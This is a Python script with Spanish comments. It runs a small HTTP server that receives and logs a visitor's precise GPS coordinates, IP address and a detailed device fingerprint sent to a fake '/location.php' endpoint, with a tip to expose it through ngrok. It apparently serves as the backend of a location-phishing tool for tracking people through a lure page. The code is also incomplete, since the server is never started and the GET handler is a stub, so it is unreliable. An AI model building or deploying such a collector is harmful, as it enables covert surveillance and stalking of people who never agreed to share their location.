from http.server import HTTPServer, SimpleHTTPRequestHandler
import urllib.parse
import json
from datetime import datetime
import os

class MyHandler(SimpleHTTPRequestHandler):
    
    def do_POST(self):
        if self.path == '/location.php':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = urllib.parse.parse_qs(post_data.decode())
            
            # obtener datos
            result = {
                'timestamp': datetime.now().isoformat(),
                'ip': self.client_address[0],
                'location': {
                    'lat': data.get('Lat', [None])[0],
                    'lon': data.get('Lon', [None])[0],
                    'acc': data.get('Acc', [None])[0],
                    'alt': data.get('Alt', [None])[0],
                    'dir': data.get('Dir', [None])[0],
                    'spd': data.get('Spd', [None])[0]
                },
                'device': {
                    'platform': data.get('Ptf', [None])[0],
                    'browser': data.get('Brw', [None])[0],
                    'cores': data.get('Cc', [None])[0],
                    'ram': data.get('Ram', [None])[0],
                    'vendor': data.get('Ven', [None])[0],
                    'render': data.get('Ren', [None])[0],
                    'width': data.get('Wd', [None])[0],
                    'height': data.get('Ht', [None])[0],
                    'os': data.get('Os', [None])[0]
                },
                'status': data.get('Status', ['unknown'])[0]
            }
            
            # Guardar en archivo
            if not os.path.exists('logs'):
                os.makedirs('logs')
            
            with open('logs/location_data.json', 'w') as f:
                json.dump(result, f, indent=2)
            
            # Responder
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'success'}).encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_GET(self):
        if self.path == '/location.php':
            # uso del GET 
            parsed = urllib.parse.urlparse(self.path)
            query = urllib.parse.parse_qs(parsed.query)
            # ... procesar similar a POST ...
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'success'}).encode())
        else:
            super().do_GET()

if __name__ == '__main__':
    server = HTTPServer(('localhost', 8000), MyHandler)
    print('Servidor en http://localhost:8000')
#usa ngrok o tu propio server
